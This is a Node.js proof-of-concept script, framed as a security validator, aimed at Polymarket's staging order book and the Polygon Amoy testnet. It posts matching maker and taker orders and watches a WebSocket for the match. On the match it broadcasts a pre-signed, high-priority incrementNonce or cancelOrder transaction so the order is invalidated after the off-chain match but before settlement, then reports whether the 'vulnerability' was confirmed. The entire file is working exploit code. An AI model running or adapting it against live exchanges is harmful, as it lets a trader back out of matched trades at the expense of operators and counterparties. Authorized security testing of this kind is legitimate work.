require('dotenv').config();
const { ethers } = require('ethers');
const axios = require('axios');
const WebSocket = require('ws');
const { Logger: L, getAuthHeaders } = require('./utils');

/**
 * PRODUCTION-GRADE POLYMARKET RACE CONDITION VALIDATOR (V3)
 * Focus: Transaction Determinism, Gas Optimality, and Edge-Case Resilience.
 */

/**
 * Application Configuration
 * @constant {Object}
 */
const CONFIG = {
    CLOB_STAGING: "https://clob-staging.polymarket.com",
    WS_STAGING: "wss://ws-subscriptions-clob-staging.polymarket.com/ws/user",
    CHAIN_ID: 80002,
    EXCHANGE_ADDR: "0x4bFb41d5B3570DeFd03C39a9A4D8dE6Bd8B8982E",
    MARKET_QUERY: process.env.MARKET_QUERY || "Bitcoin",
    PRIORITY_GWEI: process.env.PRIORITY_GWEI || "300",
    MODE: process.env.MODE || "NONCE_BUMP",
};

/**
 * Smart Contract ABI Definitions
 * @constant {string[]}
 */
const ABI = [
    "function incrementNonce() external",
    "function nonces(address) external view returns (uint256)",
    "function cancelOrder(tuple(uint256 salt, address maker, address signer, address taker, uint256 tokenId, uint256 makerAmount, uint256 takerAmount, uint256 expiration, uint256 nonce, uint256 feeRateBps, uint8 side, uint8 signatureType, bytes signature) order) external"
];

/**
 * Makes an authenticated API request to Polymarket.
 * @param {string} method - HTTP method.
 * @param {string} path - Endpoint path.
 * @param {Object} [data=null] - Request payload.
 * @returns {Promise<Object>} API response data.
 */
async function apiRequest(method, path, data = null) {
    try {
        const bodyStr = data ? JSON.stringify(data) : "";
        const headers = getAuthHeaders(method, path, bodyStr);
        const response = await axios({ 
            method, 
            url: `${CONFIG.CLOB_STAGING}${path}`, 
            data, 
            headers,
            timeout: 10000 // Explicit timeout to prevent hanging
        });
        
        // Strict input validation
        if (!response || typeof response.data === 'undefined') {
            throw new Error("Invalid or empty response from API");
        }
        
        return response.data;
    } catch (e) { 
        L.err(`API Fail: ${method} ${path}`, e.response?.data || e.message); 
        throw e; 
    }
}

/**
 * Main execution flow for the race condition validator.
 * @async
 */
async function main() {
    L.info("Initializing Hardened Security Test...");
    
    let isShuttingDown = false;
    let ws;
    let pingInterval;
    let reconnectTimeout;
    let monitor;

    // Graceful shutdown handling
    const cleanup = () => {
        if (isShuttingDown) return;
        isShuttingDown = true;
        L.info("Cleaning up resources...");
        if (pingInterval) clearInterval(pingInterval);
        if (reconnectTimeout) clearTimeout(reconnectTimeout);
        if (monitor) clearInterval(monitor);
        if (ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING)) {
            ws.close();
        }
    };

    process.on('SIGINT', () => {
        L.info("SIGINT received. Shutting down gracefully...");
        cleanup();
        process.exit(0);
    });
    process.on('SIGTERM', () => {
        L.info("SIGTERM received. Shutting down gracefully...");
        cleanup();
        process.exit(0);
    });

    try {
        let rpcUrl = process.env.RPC_URL;
        if (!rpcUrl) {
            rpcUrl = "https://rpc-amoy.polygon.technology/";
            L.warn(`Missing RPC_URL. Using default: ${rpcUrl}`);
        }

        let makerPk = process.env.MAKER_PK;
        let takerPk = process.env.TAKER_PK;
        
        if (!makerPk || !takerPk) {
            L.warn("Missing MAKER_PK or TAKER_PK. Auto-generating temporary keys.");
            if (!makerPk) makerPk = ethers.Wallet.createRandom().privateKey;
            if (!takerPk) takerPk = ethers.Wallet.createRandom().privateKey;
        }

        const provider = new ethers.providers.JsonRpcProvider(rpcUrl);
        const maker = new ethers.Wallet(makerPk, provider);
        const taker = new ethers.Wallet(takerPk, provider);
        const exchange = new ethers.Contract(CONFIG.EXCHANGE_ADDR, ABI, maker);

        L.step(1, "Pre-flight & Gas Strategy");
        const feeData = await provider.getFeeData();
        const baseFee = feeData.lastBaseFeePerGas || ethers.utils.parseUnits("30", "gwei");
        const priorityFee = ethers.utils.parseUnits(CONFIG.PRIORITY_GWEI, "gwei");
        const maxFee = baseFee.mul(2).add(priorityFee); 

        L.info(`Base Fee Estimate: ${ethers.utils.formatUnits(baseFee, "gwei")} Gwei`);
        L.info(`Target Priority: ${CONFIG.PRIORITY_GWEI} Gwei`);
        L.info(`Max Fee: ${ethers.utils.formatUnits(maxFee, "gwei")} Gwei`);

        L.step(2, "Market Selection");
        const markets = await apiRequest("GET", "/markets");
        
        // Strict validation of API response
        if (!markets || !Array.isArray(markets.data)) {
            throw new Error("Invalid response format for markets");
        }
        
        let target = markets.data.find(m => m && m.active && m.accepting_orders && typeof m.question === 'string' && m.question.includes(CONFIG.MARKET_QUERY));
        if (!target) {
            L.warn(`No active ${CONFIG.MARKET_QUERY} market found. Falling back to the first available active market.`);
            target = markets.data.find(m => m && m.active && m.accepting_orders);
        }
        if (!target || !target.tokens || !Array.isArray(target.tokens) || target.tokens.length === 0) {
            throw new Error("No valid active markets found.");
        }
        
        const tokenId = target.tokens[0].token_id;
        if (typeof tokenId !== 'string' && typeof tokenId !== 'number') {
            throw new Error("Invalid token ID in market data.");
        }
        L.info(`Target: ${target.question} (${tokenId})`);

        L.step(3, "Atomic Order Signing");
        const domain = { name: "Polymarket CTF Exchange", version: "1", chainId: CONFIG.CHAIN_ID, verifyingContract: CONFIG.EXCHANGE_ADDR };
        const types = {
            Order: [
                { name: "salt", type: "uint256" }, { name: "maker", type: "address" },
                { name: "signer", type: "address" }, { name: "taker", type: "address" },
                { name: "tokenId", type: "uint256" }, { name: "makerAmount", type: "uint256" },
                { name: "takerAmount", type: "uint256" }, { name: "expiration", type: "uint256" },
                { name: "nonce", type: "uint256" }, { name: "feeRateBps", type: "uint256" },
                { name: "side", type: "uint8" }, { name: "signatureType", type: "uint8" }
            ]
        };

        let makerNonce;
        try {
            makerNonce = await exchange.nonces(maker.address);
        } catch (e) {
            L.warn("Contract nonces() call failed, falling back to nonce 0.");
            makerNonce = ethers.BigNumber.from(0);
        }
        const makerOrder = {
            salt: Math.floor(Math.random() * 1000000000),
            maker: maker.address, signer: maker.address, taker: ethers.constants.AddressZero,
            tokenId: String(tokenId), makerAmount: "10000000", takerAmount: "5000000",
            expiration: Math.floor(Date.now() / 1000) + 3600,
            nonce: makerNonce.toNumber(), feeRateBps: 0, side: 0, signatureType: 0
        };
        const makerSig = await maker._signTypedData(domain, types, makerOrder);
        const fullMakerOrder = { ...makerOrder, sig: makerSig };

        L.step(4, "WebSocket & Race Logic");
        let raceTriggered = false;

        const populateRaceTx = async () => {
            const gasLimit = CONFIG.MODE === "CANCEL" ? 100000 : 50000;
            const txData = CONFIG.MODE === "CANCEL" 
                ? await exchange.populateTransaction.cancelOrder(fullMakerOrder)
                : await exchange.populateTransaction.incrementNonce();
            
            return {
                ...txData,
                chainId: CONFIG.CHAIN_ID,
                type: 2,
                maxPriorityFeePerGas: priorityFee,
                maxFeePerGas: maxFee,
                gasLimit: gasLimit,
                nonce: await provider.getTransactionCount(maker.address, 'pending')
            };
        };

        L.info("Pre-validating and signing race transaction...");
        const rawTx = await populateRaceTx();
        const preSignedTx = await maker.signTransaction(rawTx);
        L.info("Race transaction signed and ready in memory.");

        const connectWs = () => {
            if (isShuttingDown) return;
            ws = new WebSocket(CONFIG.WS_STAGING);
            
            ws.on('open', () => {
                L.info("WS Connected.");
                const authPayload = {
                    apiKey: process.env.POLY_API_KEY,
                    secret: process.env.POLY_API_SECRET,
                    passphrase: process.env.POLY_API_PASSPHRASE
                };
                ws.send(JSON.stringify({ type: "user", auth: authPayload }));
                L.info("WS Subscribed to user channel. Waiting for match...");
                
                // Keep-alive heartbeat
                pingInterval = setInterval(() => {
                    if (ws.readyState === WebSocket.OPEN) {
                        ws.ping();
                    }
                }, 30000);
            });

            ws.on('pong', () => {
                // Heartbeat acknowledged
            });

            ws.on('message', async (data) => {
                let msg;
                try {
                    // Strict type checking and validation for incoming WS messages
                    msg = JSON.parse(data);
                } catch (e) {
                    L.warn("Failed to parse WS message");
                    return;
                }
                
                if (!msg || typeof msg !== 'object') return;

                if ((msg.event === 'match' || msg.type === 'fill' || msg.type === 'order_fill') && !raceTriggered) {
                    raceTriggered = true;
                    const tradeId = msg.trade_id || msg.id || 'unknown';
                    L.race(`MATCH DETECTED: Trade ${tradeId}`);
                    
                    const startTime = Date.now();
                    provider.sendTransaction(preSignedTx).then((tx) => {
                        L.info(`TX Broadcast Success in ${Date.now() - startTime}ms. Hash: ${tx.hash}`);
                        return tx.wait();
                    }).then((receipt) => {
                        L.info(`TX Mined in Block: ${receipt?.blockNumber} (Status: ${receipt?.status === 1 ? 'SUCCESS' : 'REVERTED'})`);
                    }).catch(e => {
                        L.err("Broadcast Error", e.message);
                    });
                }
            });

            ws.on('close', () => {
                if (pingInterval) clearInterval(pingInterval);
                if (!isShuttingDown) {
                    L.warn("WS closed unexpectedly. Reconnecting in 5s...");
                    reconnectTimeout = setTimeout(connectWs, 5000);
                }
            });

            ws.on('error', (err) => {
                L.err("WS Error", err.message);
                if (ws && ws.readyState === WebSocket.OPEN) {
                    ws.close(); // trigger reconnect via close event
                }
            });
        };

        // Start WebSocket connection
        connectWs();

        L.info("Posting Maker Order...");
        await apiRequest("POST", "/order", fullMakerOrder);
        
        L.info("Posting Taker Order...");
        const takerOrder = { ...makerOrder, maker: taker.address, signer: taker.address, side: 1, makerAmount: "5000000", takerAmount: "10000000", salt: Math.floor(Math.random() * 1000000000) };
        const takerSig = await taker._signTypedData(domain, types, takerOrder);
        await apiRequest("POST", "/order", { ...takerOrder, sig: takerSig });

        L.step(5, "Monitoring Result");
        monitor = setInterval(async () => {
            try {
                const trades = await apiRequest("GET", `/trades?address=${maker.address}`);
                // Validate API response structure
                if (!trades || !Array.isArray(trades.data)) return;
                
                const lastTrade = trades.data[0];
                if (lastTrade && typeof lastTrade === 'object') {
                    const status = lastTrade.status;
                    const reason = lastTrade.reason || 'None';
                    L.info(`Trade Status: ${status} | Reason: ${reason}`);
                    if (status === 'FAILED' || status === 'RETRYING') {
                        const r = (typeof reason === 'string' ? reason : "").toLowerCase();
                        if (r.includes("nonce") || r.includes("cancel")) {
                            cleanup();
                            L.res(true, `Vulnerability Confirmed: Order invalidated AFTER off-chain match.`);
                            process.exit(0);
                        }
                    } else if (status === 'CONFIRMED') {
                        cleanup();
                        L.res(false, "Vulnerability Not Triggered: Operator settled before invalidation.");
                        process.exit(0);
                    }
                }
            } catch (e) {
                L.warn(`Monitor error: ${e.message}`);
            }
        }, 2000);
    } catch (e) {
        L.err("Fatal error during execution", e.message);
        cleanup();
        process.exit(1);
    }
}

if (require.main === module) {
    main().catch(e => { 
        L.err("Fatal Unhandled", e.message); 
        process.exit(1); 
    });
}

module.exports = { main, apiRequest };
